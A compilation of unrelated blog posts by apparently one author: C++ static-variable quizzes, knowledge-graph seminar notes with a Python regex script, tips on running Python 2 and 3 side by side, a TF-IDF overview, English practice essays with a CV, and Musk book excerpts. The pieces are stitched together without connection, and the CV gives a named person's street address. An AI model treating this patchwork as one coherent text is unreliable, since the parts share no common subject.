// aiqiyitest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>

using namespace std;


int fun(int a,int b)
{
	static int m =1,i=2;
	i+= m +1;
	m = i +a +b;
	return m;
}
int _tmain(int argc, _TCHAR* argv[])
{

	int k = 5,m = 2,p;
	p = fun(k,m);
	cout<<p<<",";
	p = fun(k,m);
	cout<<p<<endl;
	return 0;
}







// aiqiyitest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>

using namespace std;
int i = 0;

 void fun()
 {
	 {

	 static int i = 1;
	 std::cout<<i++<<',';
	 }
	 std::cout<<i<<',';
 }

int _tmain(int argc, _TCHAR* argv[])
{
	fun();
	fun();
	return 0;
}












昨天在北理工参加了一场由 雪晴数据网和北京理工大学大数据创新学习中心联合举办的知识图谱分享活动，聆听了一下午报告，可谓是受益匪浅。一下午时间安排的非常饱满，总共三场报告。
不得不说首都的学校就是厉害啊，楼都这么漂亮。

下面我就来分别说说重点和感想。
1.佛学知识图谱构建技术
东南大学 漆桂林教授

1.1 什么是知识？

1.2 知识图谱为搜索引擎带来的补充作用！

1.3知识图谱的几个关键技术
1.data extraction
数据从哪里来？
2.entity matching
就是说怎么知道beijing和北京是一个东西
3.type inference
e.g. China is an instance of country
1.Explicit IsA Relation Detector 
2.Category Attributes Generator
3.Instance Type Ranker

以上步骤中包含一些复杂算法，我个人觉的偏工程应用，具体参考ppt，在下载链接中。
1.4 data extraction实战
报告的老师基于以上内容给出了一个课堂小实战训练，让我们直观体验了一下构建知识图谱中的基础性工作，知识抽取，从非结构化数据中抽取结构化内容，这和我们大数据领域中首当其冲的数据清洗步骤是不谋而合的。
实例文本:
*************************************************************************
title:大报国慈仁寺

大报国慈仁寺，俗称报国寺，位于北京市西城区，在广安门内大街路北。
经考证报国寺始建于辽代；明代塌毁，成化二年（1466年）重修，改名慈仁寺，俗称报国寺；清乾隆十九年（1754年）重修，更名为大报国慈仁寺。曾有七进院落，七层殿堂，后有毗卢阁，为当时北京南城最大庙宇。1900年因义和团在此寺设坛，被八国联军用炮轰毁。现全寺已修整一新，辟作“报国寺文化市场”，成为中国收藏活动著名的聚集地。
明清之际学者顾炎武（字亭林）在北京时曾住该寺西院。道光二十三年（1843年）改西院为顾亭林祠。如今在各种古旧书籍、钱币邮票、古玩首饰等的商摊中，祠堂已不可见，只余《顾亭林先生祠记》和《重建顾亭林先生祠记》两块碑文记载当年旧事。
目前每周四为报国寺文化市场交易日。

*************************************************************************
title:法门寺

法门寺，又称法云寺、阿育王寺，位于中国陕西省宝鸡市扶风县城北10公里处的法门镇。始建于东汉末年桓灵年间，距今约有1700多年历史，有“关中塔庙始祖”之称。法门寺因舍利而置塔，因塔而建寺，原名阿育王寺。释迦牟尼佛灭度后，遗体火化结成舍利。1980年以来，法门寺在前任方丈澄观、净一法师的住持下，相继建成大雄宝殿、玉佛殿、禅堂、祖堂、斋堂、寮房、佛学院等仿唐建筑。现任主持为中国佛教协会副会长学诚法师。
=== 建寺 ===
关于建寺时间，从唐代时就已无法准确确定了。有一种说法认为法门寺及真身宝塔始建于古印度孔雀王朝阿育王（前273年~前232年）时期。阿育王统一印度后为了弘扬佛法，将佛的舍利分送世界各地，兴建八万四千塔。中国有十九处，法门寺为第五处，先建塔后建寺。北周以前法门寺名为阿育王寺，寺塔名为阿育王塔。另一种说法受到了出土的汉代瓦当、砖刻的支持，认为法门寺建于东汉桓灵之世。
公元558年，北魏皇室后裔拓跋育曾扩建，并于元魏二年（494年）首次开塔瞻礼舍利。
基于给出的文本文件，进行正则表达式的提取python3脚本：


#-*-coding:utf-8-*-

import re

def read_file(filename):
    with open(filename, encoding='utf-8') as fd: 
        for line in fd: 
            yield line

if __name__== "__main__":

    filename = "templeArticles.txt"
    title = re.compile('^title:')
    weiyu = re.compile('位于([\\S]+)(，|。){0,1}')
    shijianyu = re.compile('始建于(((?!，|；|。).)+)(，|；|。)')

    for line in read_file(filename):
        # 处理文件每一行文件

        if re.match(title,line):
            print(line[6:-1])
            continue
        if re.findall(weiyu,line):
            print('位于: ' + re.findall(weiyu,line)[0][0])
            continue
        if re.findall(shijianyu,line):
            print('始建于：' + re.findall(shijianyu,line)[0][0])
            continue


处理结果：

1.5 不能简单使用正则的场景
无法用规则抽取的原因： 
句式种类繁多，无法找到高质量且匹配多的规则。 
只能界定属性值的一个边界。（如：用规则“(，|。){0,1} ([\S]+)担任主持”匹配上述5个句子，能得到“，并由其徒弟佛智法师”和“，之后交由第一世创古仁波切”，但是无法找到法师名字的前边界）

对于这种问题，需要使用多规则来进行抽取，包括但不限于机器学习深度学习等。
1.6 总结
整体给我的直观感觉是，知识图谱的构建工作是需求驱动的，它需要非常多的人工参与才能构建精确，并且能为你的搜索引擎，智能问答系统提供锦上添花的作用。

2.知识图谱应用关键技术及行业应用

这一场略微有广告嫌疑，不过报告老师提到了面向数据的互联网这个新奇的概念。并且突出了互联网本体，实体的概念。本体中突出和强调的是概念以及概念之间的关系。
2.1 本体以及什么是知识图谱

2.2 知识图谱的部分应用


2.3 时代的变化，思维的变化

2.4 大数据应用的挑战—-多源异构数据的融合
这块老师总结的非常到位，我司也面临同样的问题，知识图谱可以解决这两个问题么？我们拭目以待！


2.5 人民的名义—-关系图谱发掘
现场咨询了老师，他说是echarts结合一些其他定制技术做的效果，这块暂时没有拿到视频，是现场手机拍摄 的，大家凑活看吧。



3.中文知识图谱CN-DBpedia构建的关键技术
徐波 
复旦大学知识工场实验室 

徐老师这个报告真的是干货满满，他讲了非常多的技术细节，包括cn-dpedia的架构，以及我印象比较深刻的cn-dbpedia中知识更新的问题，以及采用深度学习来抽取特征的新思路。
3.1 CN-DBPEDIA系统框架


3.2 知识库实体更新


参考文献
以上三场报告ppt
资料打包下载
http://download.csdn.net/detail/wangyaninglm/9866353 









绪论
最近做课题，需要分析短文本的标签，在短时间内学习了自然语言处理，社会标签推荐等非常时髦的技术。我们的需求非常类似于从大量短文本中获取关键词（融合社会标签和时间属性）进行用户画像。这一切的基础就是特征词提取技术了，本文主要围绕关键词提取这个主题进行介绍（英文）。
不同版本python混用（官方用法）
Python2 和python3 是一个神一般的存在，如何让他们共存呢，直到我用了pycharm我才知道为啥这么多人选择它，如下图所示配置两个目录直接可以混用了，叼炸天。

插播一个广告，想修改pycharm中python注释的颜色找了半天居然得这么搞：

当大家搜索如何在系统中混合使用python2和python3，国内网站经常会让大家把其中一个python.exe改个名字，这样区分开两个可执行文件的名字，但是这样做有一个重大的隐患，就是修改了名字的那个python对应的pip将无法使用。有时候还是需要用用命令行的，怎么办？

官方用法为： 
　　在安装Python3（>=3.3）时，Python的安装包实际上在系统中安装了一个启动器py.exe，默认放置在文件夹C:\Windows\下面。这个启动器允许我们指定使用Python2还是Python3来运行代码（当然前提是你已经成功安装了Python2和Python3）。 
　　 
　　如果你有一个Python文件叫 hello.py，那么你可以这样用Python2运行它 
　　

py -2 hello.py

　　类似的，如果你想用Python3运行它，就这样

py -3 hello.py

　　去掉参数 -2/-3 
　　 
　　每次运行都要加入参数-2/-3还是比较麻烦，所以py.exe这个启动器允许你在代码中加入说明，表明这个文件应该是由python2解释运行，还是由python3解释运行。说明的方法是在代码文件的最开始加入一行 
　　

#! python2

或者

#! python3

　　分别表示该代码文件使用Python2或者Python3解释运行。这样，运行的时候你的命令就可以简化为 
　　

py hello.py

使用pip 
　　 
　　当Python2和Python3同时存在于windows上时，它们对应的pip都叫pip.exe，所以不能够直接使用 pip install 命令来安装软件包。而是要使用启动器py.exe来指定pip的版本。命令如下： 
　　

py -2 -m pip install XXXX

　　-2 还是表示使用 Python2，-m pip 表示运行 pip 模块，也就是运行pip命令了。如果是为Python3安装软件，那么命令类似的变成 
　　

py -3 -m pip install XXXX 
  　　

#! python2 和 # coding: utf-8 哪个写在前面？
　　对于Python2用户还有另外一个困惑，Python2要在代码文件顶部增加一行说明，才能够在代码中使用中文。如果指明使用的Python版本也需要在文件顶部增加一行，那哪一行应该放在第一行呢？ 
　　 
　　#! python2 需要放在第一行，编码说明可以放在第二行。所以文件开头应该类似于： 
　　

#!python2 
  # coding: utf-8

　　有了这些技巧，Python2和Python3就可以愉快地在一起玩耍了～ 
　　 
　　Python标准：https://www.python.org/dev/peps/pep-0397/

信息检索概述
信息检索是当前应用十分广泛的一种技术，论文检索、搜索引擎都属于信息检索的范畴。通常，人们把信息检索问题抽象为：在文档集合D上，对于由关键词w[1] … w[k]组成的查询串q，返回一个按查询q和文档d匹配度 relevance (q, d)排序的相关文档列表D。
对于这一基问题，先后出现了布尔模型、向量模型等各种经典的信息检索模型，它们从不同的角度提出了自己的一套解决方案。
布尔模型以集合的布尔运算为基础，查询效率高，但模型过于简单，无法有效地对不同文档进行排序，查询效果不佳。
向量模型把文档和查询串都视为词所构成的多维向量，而文档与查询的相关性即对应于向量间的夹角。不过，由于通常词的数量巨大，向量维度非常高，而大量的维度都是0，计算向量夹角的效果并不好。另外，庞大的计算量也使得向量模型几乎不具有在互联网搜索引擎这样海量数据集上实施的可行性。
TF-IDF原理概述
如何衡量一个特征词在文本中的代表性呢？以往就是通过词出现的频率，简单统计一下，从高到低，结果发现了一堆的地得，和英文的介词in of with等等，于是TF-IDF应运而生。
TF-IDF不但考虑了一个词出现的频率TF，也考虑了这个词在其他文档中不出现的逆频率IDF，很好的表现出了特征词的区分度，是信息检索领域中广泛使用的一种检索方法。
Tf-idf算法公式以及说明:

具体实现如下所示，公式分成两项，词频*逆词频，逆词频取log值。

 
注意分母中的+1，在很多文献中并没有出现，这个可能引发异常。
本人写了一份代码近期正在修改，后续传到github 上，再贴出来。文章末尾贴出了两份我认为比较好的代码，一份是面向对象的实现一份是分布式的。
tfidf源代码实现及相关博客资料：
python scikit-learn计算tf-idf词语权重（scikit-learn包中提供了tfidf的矩阵实现，缺点是词数量过大可能溢出） 
http://www.tuicool.com/articles/U3uiiu
http://www.cnblogs.com/chenbjin/p/3851165.html 
http://blog.csdn.net/liuxuejiang158blog/article/details/31360765?utm_source=tuicool&utm_medium=referral 
http://blog.csdn.net/lsldd/article/details/41520953 
http://blog.csdn.net/zhb_bupt/article/details/40985831 
http://www.tuicool.com/articles/feIji2
参考文献

http://www.ruanyifeng.com/blog/2013/03/tf-idf.html
https://news.cnblogs.com/n/161240/ （tf-idf的概率解释）
https://www.python.org/dev/peps/pep-0397/  （python不同版本共存官方文档）
http://mt.sohu.com/20160416/n444499895.shtml （python版本混用中文翻译）

github代码：
https://github.com/mirsamantajbakhsh/TFIDF 
https://github.com/laertispappas/mapreduce_python 
(分布式版本) 









science and technology (Mobile phone,Emai)—-口语练习 
p.s.希望大家主要借鉴格式，忽略具体内容
My cellphone
My cellphone belongs to Nokia E-series with QWER-keyboard which is my favourite.It is very convenient and fast to send text message and find the contant.In addition,although it looks old,It’s still a smart phone, with symbian system in it,navigation,Instant messageer . 
advantage 
  mobile phones help avoid people travelling long distance to get to know the things in person. 
nowadays, cellphone has become a social tool and it change the way we bank and play,fragmentation our time,there is statistic shows that… 
driving widespread change in the banking and retailing industies. 
disadvantages 
  The radio activites may do harm to our health.People get addict to paste pictures on the social online world and catch friend’s attention.If someone gose out for dinner, the first thing she or him dose is to take a picture of the food instead of enjoy the food. Too much attention on the cellphone distracts people’s focus on the enjoyment of life.
Culture shock
Culture shock usually involves at least four stages,namely Excitement and Enthusiasm,Irritability, Adaptation,Biculturalism.The journey through it has also been portrayed as moving from ethnocentrism to ethnorelativism. 
  The first stage is the feeling of excitement and enthusiasm that when you go to a new place and meeting with different new people however,this stage do not last long as soon as real differences become evident,The differences that go beyond food and language.Irritability can come at any time, and this is the second stage. 
  In addition, the longest, most difficult and most rewarding stage called – Adaptation.During this process, students work at adapting to the native customs and habits. 
  At last, the so called Biculturalism stage will occur, this is when the student realize that they have become competent in another culture.They accept the whole fact. 
  In one word,the better you can adapt to another culture, the less discomfort and depression you will feel about culture shock.
City makes a better life
According to the text,the author tell us how the city hurts your brain and what you can do about it.At the beginnin ,the author take some examples to evident that once man is starklack of nature and being in a city may cause something like cognitive deficits,low productivity of the brain and so on.In addition,living in the city may cause attention problem and as we all know the density of urban life also make us easily lose self-control since the brain is assaulted with temptation and resisting them which makes us exhausted. 
  At last ,although someone suggest that nature can help our brain restore attention because its full of objects that automatically capture our attention without triggering a negative emotion;  the author still remind us that cities still remain the sources of intellectual life.Just as the 2010 ShangHai Expo says: City makes a better life. 
  Urban life has both positive and negative side: On one hand, the city always been an engine of intelletual life, on the other hand, it is not easy to live in the city because it spreads terrible disease and is far away from nature with conciderable pressures. 
  As far as I am conserned,I support the idea of living in the city,In china city’s infrasturcture is much better than the rural-area, it get better school,hospital , and vary kinds of goods.If you have a privaty car it will make more convenient to go everywhere,and get whatever you want. 
However, the air contidion of city  is getting more and more terrible.If you want to make all walks of your life convenient you must suffer it,It’s a really akward situation in our country.
car you want to buy
In the future I would like to have a BMW. I think BMW makes the slickest car on the road. First, I would choose a car rather than a motorbike or truck because cars are a nice mix between maneuverability and versatility. A big rig like a truck wastes a lot of gas. A motorcycle can get good mileage, but does not work well in snowstorms. 
  I would want to buy a red, mid-sized BMW. I would pick red because it is a color that stands out in a crowd. I would keep it washed and spruced-up all the time so that it would turn the girls’ heads. It is difficult to wow someone with your car if the inside looks like a pigsty. 
The car will cost a pretty penny. BMWs are not a poor man’s cars. Most people who drive them are really loaded. In light of this, it will probably take some time before I can shell out the money to buy one. 
  I would like to buy a BMW because a good car is a mark of pride in China. Not all cars are the same. I really like cars and tend to dote on them. I love the feeling of driving on the open road. I like driving with the pedal to the metal, going as fast as the car will go. I love to go joy riding at night without the lights. It is a heart-stopping experience. I guess I really want the car as a trophy to show off to my coworkers. If I owned a BMW I would be the envy of the whole office.
Personal Statement
I would like to build on my solid education and experience as an engineer for a Ph.D. degree in computer science at a distinguished university. I wish in particular to be trained at an advance level in software system, image process, and three-dimensional reconstruction. My ultimate goal is to become an outstanding software engineer, and create excellent product to make people live a better life. As an applicant to Carnegie Mellon University’s doctoral program in Computer Science, I am very glad to have this opportunity to give you a brief introduction of myself.
I received a bachelor degree from Xi’an University of Arts and Science in 2012, major in Software Engineering. Throughout four years of undergraduate study, I completed the whole fundamental courses related to both software and hardware areas of research, such as, Data Structures, Software Engineering, Computer Network, Operating System, programming languages: c, c++,java. Moreover, as a term project,I designed and developed a student information management system, using MFC and Microsoft SQL 2005 edition’s database. My graduate design is Fingerprint Contrast and Analysis System. In this design, I adopt the Visual Studio 2008 edition’s MFC, in accordance with software development which uses top-to-down process and gradual refinement of the classic model, successfully achieve enhancement, binarization, thinning of fingerprint image which is based on BMP format. These achievements build a foundation for my choice of direction in postgraduate study.
After graduate from school, I was employed by a company which is specializing in network and communication security testing products. During the work time, I was not only learned the standardization process of software development, but also participated in research a remote control system based on Mac OS 10.8 named Mac-Shell. This new system, implement a typical remote monitoring system’s basic function, document management, remote command line and so on.
When I was in the workplace, besides what I had mentioned above, I did several other projects which greatly enhanced my ability of programming and debugging skills. However when I am faced up with some practical problems, for instance, Queue Scheduling, Parallel Programming, and other algorithm issues, due to lack of related knowledge, the solution I designed always seems imperfect and occurs all kinds of problems. So in order to improve my theoretical cognition, I went to Shaanxi Normal University for further education. My research directions include image processing, pattern recognition, three-dimensional reconstruction. After all these years of study, I am glad to say that my competence at independent research will serve me well, as I try to put my ideas into practice.
As far as I am concerned, a deeper exploit in my area can only be accomplished in a quality doctoral program like yours. In view of the above, I would greatly appreciate it, if you could accept me into your program and offer me whatever financial you might be able to. By giving me an opportunity to study under your seasoned guidance, you will produce not only another computer scientist but also a computer scientist who will spawn many other computer scientists.
Curriculum Vitae
Yaning Wang 
No.620 West Chang’an Street, Chang’an District, Xi’an, Shaanxi Province 
Phone:  
Email: 
Education:
M.A., Computer Software and Theory, Shaanxi Normal University, 2013 
Concentrations: Image Processing, Image Segmentation, 3D Reconstruction 
Thesis:
B.A., Software Engineering, Xi’an University, 2008
Experience:
Intern, 2012.6-2012.10 
Chinasoft International 
Learning specification process of software development
Programmer, 2013.1-2013.8 
AstronomyPoint Network Technology 
Writing network security-related software project
Research Skills:
Extensive knowledge of Image Processing and Image Segmentation
Professional Qualifications:
National Software Testing programmer certificate 
NCRE band-three network engineering certificate 
NCRE band-four database engineer certificate
Awards: 
College Scholarships 2008-2012 
College Scholarships 2013
Skills:
Microsoft Office, Familiar with Linux, Unix 
Programming ability in C++/C, MFC 
Fluent in English
self-introduction
First of all, thanks for giving me such an opportunity to come here today ,I feel very honored.
I was  born in Xi’an,and lived here for more than twenty five years .I love the local customs and practices. In 2008 I was admitted to the Xi’an University major in software engineering , in the past 4 years of college life, I had learned the computer network, data structure, operating system and other professional foundation courses, c, c++, Java and other programming languages. 
After graduating from college.I go to a  network security company, participated in the design and development a remote monitoring and control system based on windows, monitoring objects for Mac notebook, achieved the function of the document management, file upload, download, remote command execution and so on.
I go to  Shaanxi Normal University in 2013 for further education, research the relevant contents of computer vision ,during the school time I go to  IBM SPSS as a intern, learning Python and participated to a IOS project, recently I’m learning the big data processing related content, including cluster building, the basic concept of distributed data processing, and some open source tools.
above all 
I suppose I am a hard working and very nice person, I hope  I can have the opportunity to work in your company.Thank you
Smart phone and our life
In recent 10 years, smart phone occurs and greatly impacts our interactions.Mobiles make it convenient for us to keep in touch with each other wherever they are,by using Micro-message and QQ.It has been part of our life, and we are all addicted to it.Have you ever ask yourself, am I over-dependent on cell-phones nowadays.
Needless to say, everyday when you wake up, the first thing you have to do is to check the phone and see if someone send a new statement,In addition, when you go out for a dinner,  the first thing you do is to take a picture of the food instead of enjoying it. Too much attention on the cellphone have already distracted your focus on the enjoyment of life.
As far as I am concerned, cell-phone can be used as alarm ,watch,cinema and useful-tools for search knowledge.However ,it is only a tool, we can’t be the slave of it.Setting free ourself from the cellphone must on the prerequisite that we must set free our mind, and get focus on the real world.
On My Graduate Program
Last year,I give up my job to enter ShannXi Normal university to get a master degree of computer science.My intention is quite simple for my farther study–make a better living and make myself clear about academic, practical problems.
However, when I begin my learning here, I suppose I have to figure out somethings as follows, first of all, nowsdays there are many more exceptionally qualified job seekers than jobs, what kind of skill will make me competitive in the market.In the three years learning I will search for that kind of ability.In addition, as an academic graduate sutdent, I have to publish a thesis. How can I be creative and generate my original idea, and then put them into practise, would be a big problem for me to consider all alone.
As far as I can concern, what I can do is to start right here and now to cherish every minutes, to implement my goal and dream.Just as a famous saying goes: Every day in every way my life is getting better and better.
文档下载
http://download.csdn.net/detail/wangyaninglm/9566432 









目录第一章 马斯克的世界：跨领域创造第二章 出生地非洲：冒险无极限的基因第三章 挺进加拿大：追寻太阳的人第四章 第一次创业：征服网络世界第五章 PayPal黑帮大佬：发动国际金融革命第六章 太空召唤：建立SpaceX创新大军第七章 全电动车：超酷超快的特斯拉第八章 痛苦、磨难与新生：现实版钢铁侠的商业版图第九章 腾飞：被颠覆的航空业第十章 电动车的复仇：毫不妥协换来最好的时机第十一章 埃隆·马斯克的统一场理论：下一个10年


◆ 本书所获赞誉
真正好的作品必须在两方面非常突出。
其一，提供许多过去没有人说过的精彩故事；
其二，不以偏概全，为一位重要人物的曲折人生提供完整说明。
显然，这本关于马斯克的书在这两方面都不负众望。作者提供了丰富的深入观察，让我们了解这位科技巨人是如何成功的。

驱使马斯克这样的实业家推动世界进步的，通常不是名利，而是强烈的使命感和充满个人英雄主义色彩的梦想和野望，以及在极少数人身上可贵地伴随终生的好奇心。
这个传奇的意义在于，让我们知道创造财富不是顶峰，也不是终点，真正传奇的成功，是通过商业来实现自己对未来的构想，为人类留下痕迹。


信仰技术改变世界、技术驱动社会变革的理想主义，是硅谷一个伟大的传统。从微软的盖茨、苹果的乔布斯、谷歌的佩奇到特斯拉的马斯克都是。中国互联网的成长举世瞩目，是时候重启技术理想主义了！

◆ 推荐序
今天在中国火热无比的全民创业，几乎也全都是互联网项目。互联网当然没什么不好（我们热爱互联网），但正如杰夫·汉默巴彻所说的那样，“我们这一代人中最优秀的头脑，都在思考如何让人们点击广告，这太糟糕了。”
◆ 关于埃隆·马斯克的梦想、野心以及创新的一切

当创业者在读这本书时，除了能够感受马斯克惊心动魄的创业历程，以及丰富有趣的人生经历之外，或许还可以得到一些其他有价值的信息。比如有目的的学习，埃隆马斯克在宾夕法尼亚求学时，一边攻读商学学位，一边研究物理学，万斯认为这是刚刚20岁出头的马斯克有意为之。比如马斯克的用人之道，他喜欢重用那些顶级学校的尖子生，寻找那些从小喜欢制造东西的人。本书中写道，SpaceX前1000名员工，无论何种职位（哪怕是清洁工），均由马斯克亲自面试。

◆ 一个传奇的意义

“我从来没觉得电动车是个‘好机会’。我其实一直觉得做特斯拉的失败率比成功率大得多，”他顿了下说，“我只是觉得这是应该要去做的事情，而且我不想苦等别人来实现。”（似乎原话是it’s a right thing to do，and I’m tired of waiting someone else to do it for me.）

◆ 偏执狂梦想家

虽然格鲁夫写下了名著《只有偏执狂才能生存》，但真正的偏执狂是马斯克。只有“疯狂”两个字才能形容马斯克。凭借着兴趣和感觉就冲进一个陌生行业，如果是一个光脚的这样做，似乎还说得过去；但如果一个已经成功的亿万富翁，一个享有成功荣誉的投资人这样做，敢把自己几乎全部的资产投入跟以前成功的行业毫无关系的地方，而且还是两个陌生行业，我想这才是真正的梦想驱动力。

◆ 我们时代的诺亚

他常常引用丘吉尔的名言：“既然必须穿越地狱，那就走下去吧。”这种勇气往往会让人绝地逢生。最后，他有着自己独到的“第一原理”思维方式。也就是说，凡事先从本质开始思考，然后再从本质一层层往回反推。在这样的思维模式下，你不会因为暂时的困难而对结果失去信心，也不会因为好高骛远而做出徒劳的努力——因为你非常清楚自己的目标是“第一原理”推导出的必然结果。这种理性的思维方式尤其值得我们学习。

◆ 认认真真地发疯

梦想可以再疯狂些，再疯狂些，再疯狂些……只要你是认认真真的。

第一章 马斯克的世界：跨领域创造
刚刚出现的热门公司——Facebook（脸书）和Twitter（推特），并不像他们的前辈——惠普、英特尔、太阳微电子公司那样，制造实体产品，能够在生产过程中雇用上万人。
在接下来的几年，人们的目标已经从冒险创造全新的行业和伟大想法，变成通过取悦消费者，以及批量生产简单应用和广告来赚快钱。“我们这代人中最聪明的大脑都在思考如何让人们点击广告，”Facebook早期工程师杰夫·汉默巴彻（Jeff Hammerbacher）对我说，“这太糟糕了。” 硅谷越来越像好莱坞。与此同时，那些消费者已逐渐转向内心世界，醉心于自己的虚拟人生。

第二章 出生地非洲：冒险无极限的基因
在这期间他接触到了对他人生影响最大的一本科幻小说——道格拉斯·亚当斯（Douglas Adams）写的《银河系漫游指南》（The Hitchhiker’s Guide to the Galaxy）。“作者在书中指出了最困难的部分是提出问题。”马斯克说，“一旦你了解了问题所在，答案就变得相对简单了。我从中得出结论，认为我们应该立志去增强人类的自我意识，这样才能更好地去理解问题所在。” 少年马斯克那时就已经做出了自己的超逻辑使命宣言。“唯一有意义的事情就是去为人类争取更大的集体启蒙。”
作为一个小男孩儿，埃隆性格中最引人注目的部分，是他对读书如饥似渴。从很小的时候开始，他似乎就书不离手。“他每天读书10个小时是家常便饭，”金巴尔说，“如果是周末，他可以一天读完两本书。”全家人去购物的时候，经常发现埃隆中途不见了，梅耶和金巴尔就跑到最近的书店去找，总能看见埃隆坐在地板上全神贯注地看书。
这成为我们不同寻常成长历程的一部分——这一系列疯狂的体验，改变了我们对风险的看法。我们很难接受长大后仅仅为了一份工作而活着，因为这很无趣。”

第三章 挺进加拿大：追寻太阳的人
教授的评价非常中肯。马斯克可以像逻辑学家那样清晰简洁地表达，同时非常准确地从一个要点转移到下一个要点。
但马斯克真正突出的地方在于，他将复杂的物理概念与商业计划相结合的能力。
不仅如此，他还显示出了将一项科研成果转化为营利性企业的非凡才能。

马斯克坚持宣扬他的早期理想——关于电动汽车、太阳能和火箭，但很难令人信服。这让人感觉他似乎在以一种强制的方式来塑造自己的人生故事。但是，对于马斯克来说，跌跌撞撞地闯进某个领域和有意为之是有明显区别的。长期以来，他一直想让世界知道，他和硅谷那些作坊式的创业者是不一样的。他并不是在顺应潮流，也不是为了发财，他是在追求一个整体的计划。“我的确在大学期间就开始思考这些事情，”他说，“这不是事后编造出来的故事。我不想被看作一个新手，我不喜欢跟风和投机。我不是投资者。我喜欢把那些对于未来真正重要和有价值的技术，以某些方式变成现实。


第四章 第一次创业：征服网络世界

投资人对于马斯克的无私奉献精神表示认同。“当他还是一个满脸长着青春痘的大学生时，埃隆就已热情满满——就好像任何事情他都要全力以赴，如果没有全力以赴，就会错失良机，”海尔曼说，“我认为风险投资人都看在眼里——他愿意赌上身家性命去建立这个平台。” 实际上，马斯克对一个风险投资人说过类似的话，他说，“我具有武士精神。我宁愿切腹，也不要失败。”


第五章 PayPal黑帮大佬：发动国际金融革命
他的下一次冒险必须跟上他那极速膨胀的野心。马斯克于是开始寻找资金充裕且效率低下、可为他和互联网所用的行业。
他们最终还是拒绝，这反倒给了我自信。所有的银行家都做着和其他所有人一样的事情。如果其他人去跳崖，这些人也会跟着去跳崖。如果房间中央有一大堆黄金没有人去捡，这些人也不会去捡。”
在公司技术基础设施的设计方面，双方产生了较多的分歧。列夫金领导下的Confinity团队更喜欢诸如Linux等开源软件，而马斯克则对微软的数据中心软件青睐有加，认为它更能维持高效。这类争吵在外人看来可能很愚蠢，但对于工程师来说却相当于一场宗教战争。
PayPal员工为打击网络诈骗而首创的技术最后成为中央情报局和联邦调查局追踪恐怖分子的基石，这些软件还被世界上最大的银行用于打击犯罪。这群才华横溢的员工成为所谓的PayPal黑帮（PayPal Mafia）——他们如今或多或少可称得上是硅谷的统治阶层——而马斯克是其中最功成名就的成员。

第六章 太空召唤：建立SpaceX创新大军
在没有任何征兆的情况下，马斯克会突然说起他的志向，说他希望用一生去完成一些有意义的、永恒的事情。他的下一个目标是太阳能或者太空。“他说，‘从逻辑上来说，我的下一个目标应该是太阳能，但我想不出如何从中盈利，’”
马斯克全然不介意朋友拿奶酪开他的玩笑。对太空思考得越多，他越意识到探索的重要性。他感觉大众好像已经丧失了对未来的雄心和希望。人们可能会觉得探索太空是一件浪费时间和精力的事，因此在与马斯克谈论这一话题便时不时地挖苦他，但马斯克却在非常真诚地思索星际之旅这件事。他希望激发大众的兴趣，使他们重拾对科学、征服未知和技术创新的热情。
马斯克来俄罗斯的时候信心满满，心想自己马上就能为全人类带来一场翻天覆地的变化，如今却铩羽而归，对人性感到失望至极。以马斯克的预算，他们只买得起俄罗斯人的火箭。“当时感觉时间过得真慢，”坎特雷尔说，“我们就坐在那儿沉默不语，看着俄罗斯农民冒雪出去采购。”忧郁的气氛一路陪伴着他们，直到登机后飞机上的酒水车推到面前。

SpaceX将会开启美国火箭领域的新纪元，一切都会变得更加现代化。马斯克认为，太空产业在过去的50年内并没有真正进步。航空公司之间少有竞争，尽管它们生产的产品性能极佳，但却造价高昂。它们发射的每一枚火箭都和法拉利一样又贵又好，但其实有时候便宜一点的本田雅阁就能满足要求。相比之下，马斯克会利用自己曾经在硅谷学到的新技术来经营SpaceX，充分利用在过去几十年里迅速发展的计算机和材料科学，使得整个公司运作得又快又好。作为一家私营企业，SpaceX还可以避免像政府承包商那样的浪费和成本超支。马斯克宣布SpaceX的第一枚火箭名为“猎鹰1号”，这是向电影《星球大战》中的“千年隼”号和自己致敬，因为他将是精彩未来的缔造者。


等到SpaceX能进行下一次发射时，距离马斯克的最初目标已经过去了4年，马斯克通过互联网产业积累的财富很快就要花光了。马斯克曾信誓旦旦地告诉大众，他不成功决不罢休，但公司内外的人都知道，SpaceX的资金可能只够再进行一两次发射了。尽管财务状况让马斯克变得很焦躁，但他几乎从不把这一面表现在员工面前。“埃隆让员工不要担心资金问题，这一点很好，”
斯派克斯说道，“他总是告诉我们精益和成功的重要性，但是他也从来不会说‘如果我们失败了，那就结束吧’，他总是很乐观。”


第七章 全电动车：超酷超快的特斯拉
但是，特斯拉的创始人越是深入地研究汽车产业，就越发意识到，那些大型汽车制造商甚至都不再自己生产汽车了。亨利·福特时代将原材料从他位于密歇根的工厂一端输入，然后在另一端产出汽车成品的生产流程已经一去不复返了。“宝马车上的挡风玻璃、内饰，以及后视镜都不是自己公司生产的，”塔彭宁说，“这些大型汽车公司唯一保留着的三个部门是内燃机研究中心、销售推广部和总装配部。我们曾天真地以为我们也能找到同样的供应商，可以提供我们所需的零件。”
马斯克以650万美元的投资成为特斯拉最大的持股人和董事长。之后，马斯克很好地运用了他手里的权利，与艾伯哈德竞争公司的控制权。“这是个错误，”艾伯哈德说，“我本应该去找更多的投资人，但是，如果我能重新再来，我还是会拿他的钱。一鸟在手，胜过二鸟在林。我们需要这笔钱。”
这家公司的全部汽车专业知识仅止于此：一帮汽车爱好者，还有一个做了不少项目的人，但这些项目仅仅达到了科技展览的参展级别，并且在传统车行业的人看来，它们所依据的科技原理是很荒谬的。另外，创始团队里没有人打算去底特律的传统汽车制造商那里寻求建议。相反，特斯拉将要做的事情与在他们之前成立的那些硅谷创业公司一样——雇用一些年轻的、对新事物如饥似渴的工程师，然后顺着事情发展的趋势去思考下一步怎么走——不必担心硅谷湾区没有将这种模式运用于汽车领域的成功先例，也不必介意建造一个复杂的实体和开发一款软件之间几乎没有任何相似之处。但是特斯拉相比于其他人的优势在于，他们最先意识到18650锂离子电池的技术潜力，并且它的前景会越来越好。正是这一点，再结合他们的努力和智慧，将成为支撑起这家公司的希望所在。
